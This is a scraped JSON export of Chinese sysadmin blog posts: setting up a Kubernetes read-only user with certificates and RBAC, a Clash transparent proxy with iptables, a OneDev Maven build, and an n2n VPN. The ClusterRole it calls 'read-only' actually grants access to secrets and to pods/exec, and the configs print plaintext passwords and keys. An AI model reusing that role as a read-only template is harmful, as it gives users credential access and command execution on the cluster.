role-pods_reader，所属命名空间是 default ，它对 pods 和 pods/log 有 get 、list、watch的权限，也就是说role-pods_reader 可以查看 default 空间的 pods 和 pods 的日志。\n三、创建 Rolebinding cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; rolebinding.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: rolebinding-default_pods_reader namespace: default roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: role-pods_reader subjects: - apiGroup: rbac.authorization.k8s.io kind: User name: reader EOF kubectl apply -f rolebinding.yaml 解释：我们创建了一个 rolebinding，名字叫做 rolebinding-default_pods_reader，同样所属命名空间是 default，它绑了两个东西，一个是 role，就是上面第二步创建的 role-pods_reader；另一个是 subject，对应了一个用户，就是我们第一步创建的那个 reader。\n四、生成 kubectl 配置文件 #!/bin/sh useraccount=reader namespace=default kubectl config set-cluster $(kubectl config view -o jsonpath=\u0026#39;{.clusters[0].name}\u0026#39;) --server=$(kubectl config view -o jsonpath=\u0026#39;{.clusters[0].cluster.server}\u0026#39;) --certificate-authority=k8s-ca.crt --embed-certs --kubeconfig=$useraccount-k8s-config kubectl config set-credentials $useraccount --client-certificate=$useraccount-k8s-access.crt --client-key=$useraccount-k8s.key --embed-certs --kubeconfig=$useraccount-k8s-config kubectl config set-context $useraccount --cluster=$(kubectl config view -o jsonpath=\u0026#39;{.clusters[0].name}\u0026#39;) --namespace=$namespace --user=$useraccount --kubeconfig=$useraccount-k8s-config kubectl config use-context $useraccount --kubeconfig=$useraccount-k8s-config 解释：上面看起来很复杂，其实就是四步，在配置文件里设置 cluster 、设置 credentials 证书、设置 context 上下文、设置当前上下文。\n完事后会产生一个完整的 reader-k8s-config 文件，如下：\n五、测试 我们验证一下：\nKUBECONFIG=reader-k8s-config kubectl get pods KUBECONFIG=reader-k8s-config kubectl auth can-i delete pods KUBECONFIG=reader-k8s-config kubectl auth can-i delete svc 这样一个对 default 空间的只读用户就建立好了\n六、集群只读用户 我们这里给出集群只读用户的 role，命名 role-cluster_reader\nkubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: role-cluster_reader rules: - apiGroups: - \u0026#34;\u0026#34; resources: - nodes - pods - pods/exec - pods/log - services - configmaps - secrets - serviceaccounts - endpoints verbs: - get - list - watch - apiGroups: - apps resources: - deployments - replicasets - daemonsets - statefulsets verbs: - get - list - watch - apiGroups: - batch resources: - jobs - cronjobs verbs: - get - list - watch EOF 以及 rolebinding，还是绑到第一步的用户 reader 的例子\nkubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: rolebinding-cluster_reader roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: role-cluster_reader subjects: - apiGroup: rbac.authorization.k8s.io kind: User name: reader EOF 生成配置文件的步骤跟上一步是一样的。\n从上面大家可以看到，其实最主要的就是 role 的 yaml 文件，里面控制着到底有怎么样的权限。\n","permalink":"https://rendoumi.com/posts/20211109-k8s_rbac/","summary":"\u003cp\u003ekubernetes 装好正常运行一段时间后，会出现要把研发和运维权限分开的场景：\u003c/p\u003e\n\u003cp\u003e比如：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e给某个用户某一指定名称空间下的管理权限\u003c/li\u003e\n\u003cli\u003e给用户赋予集群的只读权限\u003c/li\u003e\n\u003cli\u003e…\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e非常麻烦，我们这里不讨论过多的概念，从运维的角度出发，简单实用化\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e我们需要明确三个RBAC最基本的概念\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRole: 角色，它定义了一组规则，定义了一组对Kubernetes API对象的操作权限\u003c/li\u003e\n\u003cli\u003eRoleBinding: 定义了\u0026quot;被作用者\u0026quot;和\u0026quot;角色\u0026quot;的绑定关系\u003c/li\u003e\n\u003cli\u003eSubject: 被作用者，既可以是\u0026quot;人\u0026quot;，也可以是机器，当然也可以是 Kubernetes 中定义的用户(ServiceAccount主要负责kubernetes内置用户)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e我们的操作过程流程如下，首先创建客户端证书；其次创建Role角色；再创建RoleBinding，把Subject和Role绑定，就完事了；最后一步是生成 kubectl 的配置文件。\u003c/p\u003e\n\u003ch2 id=\"一创建客户端证书\"\u003e一、创建客户端证书\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e我们以已建好的阿里 ACK 为例，或者自建好的 Kubernetes 也行；确定已经有了 .kube/config 配置文件，拥有集群最高权限，并且可以正常执行 kubectl 命令。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e首先是生成证书，并向集群提出证书请求并签发，脚本如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003euseraccount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ereader\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eopenssl req -new -newkey rsa:4096 -nodes -keyout \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s.key -out \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s.csr -subj \u003cspan class=\"s2\"\u003e\u0026#34;/CN=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e\u003cspan class=\"s2\"\u003e/O=devops\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ecsr\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003ecat \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s.csr \u003cspan class=\"p\"\u003e|\u003c/span\u003e base64 \u003cspan class=\"p\"\u003e|\u003c/span\u003e tr -d \u003cspan class=\"s1\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt; k8s-csr.yaml  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eapiVersion: certificates.k8s.io/v1beta1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ekind: CertificateSigningRequest\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  name: $useraccount-k8s-access\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003espec:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  groups:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  - system:authenticated\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  request: $csr\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  usages:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  - client auth\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl create -f k8s-csr.yaml  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl certificate approve \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s-access  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl get csr \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s-access -o \u003cspan class=\"nv\"\u003ejsonpath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{.status.certificate}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e base64 --decode \u0026gt; \u003cspan class=\"nv\"\u003e$useraccount\u003c/span\u003e-k8s-access.crt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl config view -o \u003cspan class=\"nv\"\u003ejsonpath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{.clusters[0].cluster.certificate-authority-data}\u0026#39;\u003c/span\u003e --raw \u003cspan class=\"p\"\u003e|\u003c/span\u003e base64 --decode - \u0026gt; k8s-ca.crt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解释一下：我们定义了一个用户CN=reader，然后向集群发送了证书请求并签发，最终从集群获得了 reader-k8s-access.crt 的客户端证书和 k8s-ca.crt 的 CA 证书。\u003c/p\u003e","title":"Kubernetes创建普通账号"},{"content":"没啊办法，翻墙翻墙还是翻墙。\n上游有若干 trojian 、v2ray 、sock5 、http各种各样的代理，这样多种的选择，那么就装一个 clash 客户端就可以全接管了。\n说下我们的做法：找个小Linux做旁路由，DNS和网关都设置在这台机器上，局域网内的机器都通过这台上网。\n我们用到的是 clash 的 Tproxy redir-host 和 udp-proxy 模式，这种模式比较强大。用就用最强大的。\n安装很简单，操作系统 centos 或者 ubuntu 都行，项目地址：\nhttps://github.com/Dreamacro/clash\n说明书：\nhttps://lancellc.gitbook.io/clash/clash-config-file/proxy-groups/load-balance\n首先下载二进制文件，现在版本是 v1.7.1，解压后放到 /usr/local/bin 目录下\nwget https://github.com/Dreamacro/clash/releases/download/v1.7.1/clash-linux-amd64-v1.7.1.gz gzip -d clash-linux-amd64-v1.7.1.gz chmod 755 clash-linux-amd64-v1.7.1 mv clash-linux-amd64-v1.7.1 /usr/local/bin 然后生成 clash.service\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/clash.service [Unit] Description=clash service After=network.target [Service] Type=simple User=root ExecStart=/usr/local/bin/clash-linux-amd64-v1.7.1 Restart=on-failure # or always, on-abort, etc [Install] WantedBy=multi-user.target EOF 然后最重要的，就是配置文件了\n我这里这个旁路由的设备 IP 地址是 192.168.2.2，网卡设备是 enp2s0\n下卖弄\n# http的代理端口 port: 7890 #mixed-port: 7890 socks-port: 7891 redir-port: 7892 tproxy-port: 7893 ipv6: false allow-lan: true bind-address: \u0026#39;192.168.2.2\u0026#39; interface-name: enp2s0 mode: rule log-level: info external-controller: 0.0.0.0:9090 secret: \u0026#34;Fuck2021\u0026#34; external-ui: dashboard profile: store-selected: false tracing: true hosts: # 把cantv的域名解析屏蔽掉，禁止它自动升级 \u0026#39;tms.can.cibntv.net\u0026#39;: 0.0.0.0 dns: enable: true listen: 0.0.0.0:1053 enhanced-mode: redir-host # or fake-ip nameserver: - \u0026#39;114.114.114.114\u0026#39; - \u0026#39;223.5.5.5\u0026#39; fallback: - 208.67.220.220:5353 - 208.67.222.222:5353 - 101.6.6.6:5353 proxies: - name: \u0026#34;trojan1\u0026#34; type: trojan server: www.linuxboy.net port: 443 password: Fuck2021 sni: www.linuxboy.net skip-cert-verify: true - name: \u0026#34;vmess1\u0026#34; type: vmess server: 101.59.201.93 port: 41555 uuid: 7a17ae5e-fb86-42e2-abd4-b8c33cfabcd alterId: 64 cipher: auto proxy-groups: - name: Proxy type: select proxies: - trojan - name: \u0026#34;auto\u0026#34; type: url-test proxies: - vmess1 - trojan1 url: \u0026#39;http://www.gstatic.com/generate_204\u0026#39; interval: 300 rules: - DOMAIN-SUFFIX,v2ex.com,Proxy - DOMAIN-SUFFIX,t66y.com,Proxy - DOMAIN-SUFFIX,ycombinator.com,Proxy - DOMAIN-SUFFIX,reddit.com,Proxy - DOMAIN-KEYWORD,amazon,Proxy - DOMAIN-KEYWORD,google,Proxy - DOMAIN-KEYWORD,gmail,Proxy - DOMAIN-KEYWORD,youtube,Proxy - DOMAIN-KEYWORD,facebook,Proxy - DOMAIN-SUFFIX,fb.me,Proxy - DOMAIN-SUFFIX,fbcdn.net,Proxy - DOMAIN-KEYWORD,twitter,Proxy - DOMAIN-KEYWORD,instagram,Proxy - DOMAIN-KEYWORD,dropbox,Proxy - DOMAIN-SUFFIX,twimg.com,Proxy - DOMAIN-KEYWORD,blogspot,Proxy - DOMAIN-SUFFIX,youtu.be,Proxy - DOMAIN-KEYWORD,whatsapp,Proxy - SRC-IP-CIDR,192.168.1.0/32,DIRECT - SRC-IP-CIDR,192.168.2.0/32,DIRECT - IP-CIDR,127.0.0.0/8,DIRECT - GEOIP,CN,DIRECT - MATCH,Proxy 解释一下：proxy 定义了两个代理，一个是 trojan，一个是 v2ray。然后再集合成组，一个组叫 Proxy， 显式指定用 trojan；另一个组叫 auto，根据 vmess1 和 trojan1 访问 http://www.gstatic.com/generate_204 的页面速度，谁快就用谁，缺省300秒会访问一次这个页面来决定哪个代理快。\n剩下的 rules 就很简单，把自己知道要访问的域名放到代理中去，然后把局域网的 IP 段放进 DIRECT 直接访问，最后 GEO IP 不是中国的由 Proxy 兜底。\n网上有一大堆规则，八戒的建议是不要去学，规则越多越慢，你自己知道要访问什么网站需要翻墙，加进去就好了。弄一堆，自己看着都头蒙\n最后我们在 rc.local 放入以下 iptable 内容，就可以了\n### #clash ip rule add fwmark 1 table 100 ip route add local 0.0.0.0/0 dev lo table 100 # CREATE TABLE iptables -t mangle -N clash # RETURN LOCAL AND LANS iptables -t mangle -A clash -d 0.0.0.0/8 -j RETURN iptables -t mangle -A clash -d 10.0.0.0/8 -j RETURN iptables -t mangle -A clash -d 100.64.0.0/10 -j RETURN iptables -t mangle -A clash -d 127.0.0.0/8 -j RETURN iptables -t mangle -A clash -d 169.254.0.0/16 -j RETURN iptables -t mangle -A clash -d 172.16.0.0/12 -j RETURN iptables -t mangle -A clash -d 192.168.0.0/16 -j RETURN iptables -t mangle -A clash -d 224.0.0.0/4 -j RETURN iptables -t mangle -A clash -d 240.0.0.0/4 -j RETURN # whitelist China ip. # iptables -t mangle -A clash -m set --match-set china dst -j RETURN # FORWARD ALL iptables -t mangle -A clash -p udp -j TPROXY --on-port 7893 --tproxy-mark 1 iptables -t mangle -A clash -p tcp -j TPROXY --on-port 7893 --tproxy-mark 1 # REDIRECT iptables -t mangle -A PREROUTING -j clash # hijack DNS to Clash iptables -t nat -N CLASH_DNS iptables -t nat -F CLASH_DNS iptables -t nat -A CLASH_DNS -p udp -j REDIRECT --to-port 1053 iptables -t nat -I PREROUTING -p udp --dport 53 -j CLASH_DNS 最后启动clash\nsystemctl start clash ","permalink":"https://rendoumi.com/posts/20211108-clash/","summary":"\u003cp\u003e没啊办法，翻墙翻墙还是翻墙。\u003c/p\u003e\n\u003cp\u003e上游有若干 trojian 、v2ray 、sock5 、http各种各样的代理，这样多种的选择，那么就装一个 clash 客户端就可以全接管了。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e说下我们的做法：找个小Linux做旁路由，DNS和网关都设置在这台机器上，局域网内的机器都通过这台上网。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e我们用到的是 clash 的 Tproxy redir-host 和 udp-proxy 模式，这种模式比较强大。用就用最强大的。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e安装很简单，操作系统 centos 或者 ubuntu 都行，项目地址：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/Dreamacro/clash\"\u003ehttps://github.com/Dreamacro/clash\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e说明书：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://lancellc.gitbook.io/clash/clash-config-file/proxy-groups/load-balance\"\u003ehttps://lancellc.gitbook.io/clash/clash-config-file/proxy-groups/load-balance\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e首先下载二进制文件，现在版本是 v1.7.1，解压后放到 /usr/local/bin 目录下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/Dreamacro/clash/releases/download/v1.7.1/clash-linux-amd64-v1.7.1.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egzip -d clash-linux-amd64-v1.7.1.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e clash-linux-amd64-v1.7.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv clash-linux-amd64-v1.7.1 /usr/local/bin\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后生成 clash.service\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/clash.service \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Unit]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eDescription=clash service\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eAfter=network.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Service]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eType=simple\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eUser=root\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStart=/usr/local/bin/clash-linux-amd64-v1.7.1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eRestart=on-failure # or always, on-abort, etc\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Install]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eWantedBy=multi-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后最重要的，就是配置文件了\u003c/p\u003e\n\u003cp\u003e我这里这个旁路由的设备 IP 地址是 192.168.2.2，网卡设备是 enp2s0\u003c/p\u003e","title":"clash的搭建教程"},{"content":"上篇简单介绍了 onedev ，这篇我们具体拿个 java spring 的项目来实际编译一下\n首先必须确认环境：\nonedev 和 agent 都是用 root 安装运行的，然后已经安装了 docker，且 selinux 设置为 disabled，否则会出权限麻烦。\n我们用的例子是 spring 的 petclinic，正常的 build 的步骤如下：\ngit clone https://github.com/spring-projects/spring-petclinic.git cd spring-petclinic ./mvnw package 我们首先在 onedev 的 projects 新建一个项目 spring-boot\n然后到 clone 下来的源代码目录下\ncd spring-petclinic git init git add . git commit -m \u0026#34;Spring boot demo project\u0026#34; git remote add origin http://192.168.86.101:6610/spring-boot git push --set-upstream origin master 这样就可以在 spring-boot 里看到代码了\n然后看上图，有个紫色灯泡，Enable build support by adding.onedev-buildspec.yml，点那个链接\n我们增加一个 build 的步骤，里面再增加两个 job，一个是 Get code ，一个是 build\n第一步肯定是把代码拿下来，选择 Checkout Code ，命名为 Get code ，然后其他保持缺省配置，保存\n第二步就是 build 代码，选择 Execute Shell/Batch Commands，然后实际是启动了一个 docker 镜像来执行 build 的过程\nImage 填入：maven:3.5-jdk-8-alphine\nCommands 填入：\nunset MAVEN_CONFIG cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /root/.m2/settings.xml \u0026lt;settings\u0026gt; \u0026lt;proxies\u0026gt; \u0026lt;proxy\u0026gt; \u0026lt;id\u0026gt;default\u0026lt;/id\u0026gt; \u0026lt;active\u0026gt;true\u0026lt;/active\u0026gt; \u0026lt;protocol\u0026gt;http\u0026lt;/protocol\u0026gt; \u0026lt;host\u0026gt;192.168.1.10\u0026lt;/host\u0026gt; \u0026lt;port\u0026gt;3128\u0026lt;/port\u0026gt; \u0026lt;/proxy\u0026gt; \u0026lt;/proxies\u0026gt; \u0026lt;/settings\u0026gt; EOF ./mvnw package 解释一下，maven:3.5-jdk-8-alphine 这个镜像，如果在里面执行 mvnw package ，会报错 repository 的错，所以必须把 MAVEN_CONFIG 的环境变量给删除，另外整个 build 过程会去拉 N 多包和配置，大概200多兆，如果不翻墙，基本是失败。所以这里强制 mvn 使用了代理！！！否则 build 一天都不会成功。\n第三步是配置 mvn repository的缓存，大家不想每次build都去下一遍依赖包吧，在 More Settings 设置\n在Caches里填入：\nkey: maven-cache\npath: /root/.m2/repository\n然后执行 Build , 然后等待，第一次时间会很长，终于 Successful 了\n接下来的步骤就可以用 Dockerfile 生成镜像，然后推到 Harbor，再下载或者 gitops下载来各种 yaml 文件，拉 kubectl 和配置文件，就可以推送到 kubernetes 了。\n补充一下，在别的地方突然看到有 maven 的阿里镜像地址，记录一下：\n\u0026lt;mirror\u0026gt; \u0026lt;id\u0026gt;alimaven\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;aliyun maven\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;http://maven.aliyun.com/nexus/content/groups/public/\u0026lt;/url\u0026gt; \u0026lt;mirrorOf\u0026gt;*\u0026lt;/mirrorOf\u0026gt; \u0026lt;/mirror\u0026gt; ","permalink":"https://rendoumi.com/posts/20211108-onedev_maven/","summary":"\u003cp\u003e上篇简单介绍了 onedev ，这篇我们具体拿个 java spring 的项目来实际编译一下\u003c/p\u003e\n\u003cp\u003e首先必须确认环境：\u003c/p\u003e\n\u003cp\u003eonedev 和 agent 都是用 root 安装运行的，然后已经安装了 docker，且 selinux 设置为 disabled，否则会出权限麻烦。\u003c/p\u003e\n\u003cp\u003e我们用的例子是 spring 的 petclinic，正常的 build 的步骤如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/spring-projects/spring-petclinic.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e spring-petclinic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./mvnw package\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们首先在 onedev 的 projects 新建一个项目 spring-boot\u003c/p\u003e\n\u003cp\u003e然后到 clone 下来的源代码目录下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e spring-petclinic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit init\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit add .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit commit -m \u003cspan class=\"s2\"\u003e\u0026#34;Spring boot demo project\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit remote add origin http://192.168.86.101:6610/spring-boot\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit push --set-upstream origin master\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样就可以在 spring-boot 里看到代码了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211105113350311\" loading=\"lazy\" src=\"/posts/20211108-onedev_maven/image-20211105113350311.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后看上图，有个紫色灯泡，\u003ccode\u003eEnable build support by adding.onedev-buildspec.yml\u003c/code\u003e，点那个链接\u003c/p\u003e","title":"onedev构建一个实际java spring应用"},{"content":"vpn的搭建一直是一个难解的题目，openvpn、ipsec、tinc 都在用，都不够简洁。\nn2n 是一种 peer to peer 端到端的 vpn，搭建起来非常简单方便。必备利器\n首先了解一下概念\nn2n 的 vpn 分为两种角色，Supernode 超级节点和 Edgenode 边缘节点。\n很简单，Supernode 最好是公网地址，需要开放端口供其它节点连接上来；剩余的 Edgenode 可以没有公网地址，各个 Edgenode 边缘节点之间会尝试绕过 Supernode 直接连接。这大大提高了节点之间通讯的效率。通讯是加密的，非常安全。\n安装的话完全不用安装，直接一个命令就搞定了。\nhttps://github.com/ntop/n2n\n弄出两个可执行文件 supernode 和 edge 就好了\n超级节点：\n/usr/local/bin/supernode -p 11111 -v 边缘节点：\n/usr/local/bin/edge -d n2n0 -c ThisisaSecret2012 -k Fuck2020 -a 192.168.0.2 -l 41.22.59.112:11111 -f 参数解释：\n-d 生成的虚拟网卡的命名 -c 某组vpn节点的口令。大家看到启动 supernode 的时候没有任何参数，supdernode 只负责转发。supernode 支持多组不同的 vpn。这里就是用来区分不同的 vpn 组的。 -k 节点之间通讯是用的 twofish 加密算法，这里指定的是密钥 -a 节点的ip -l supernode的ip和端口 -f 放到后台 daemon 执行 这样就建立好了，系统中会多出一张 